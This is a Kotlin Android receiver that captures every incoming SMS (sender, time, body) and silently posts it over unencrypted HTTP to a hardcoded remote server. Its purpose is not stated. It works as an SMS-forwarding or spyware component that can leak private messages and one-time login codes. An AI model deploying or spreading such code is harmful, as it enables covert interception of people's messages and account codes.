package com.smsreader.receivers.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.smsreader.models.Sms
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.http.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.runBlocking
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            // Extract new sms list from Intent
            val smsList = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (smsList.isNotEmpty()) {
                val sms = Sms(
                    sender = smsList[0].displayOriginatingAddress.toString(),
                    date = SimpleDateFormat("yyyy-MM-dd hh:mm:ss", Locale.US).format(smsList[0].timestampMillis),
                    body = smsList[0].displayMessageBody.toString(),
                )

                // Send newly received sms to server
                sendToServer(sms)
            }
        }
    }

    private fun sendToServer(smsData: Sms) {
        val url = "http://dvu90815.pythonanywhere.com/api/v1/sms/"
        val client: HttpClient = HttpClient(CIO) {
            install(ContentNegotiation) { json() }
        }

        runBlocking {
            val response = client.post(url) {
                contentType(ContentType.Application.Json)
                setBody(smsData)
            }
        }
    }
}
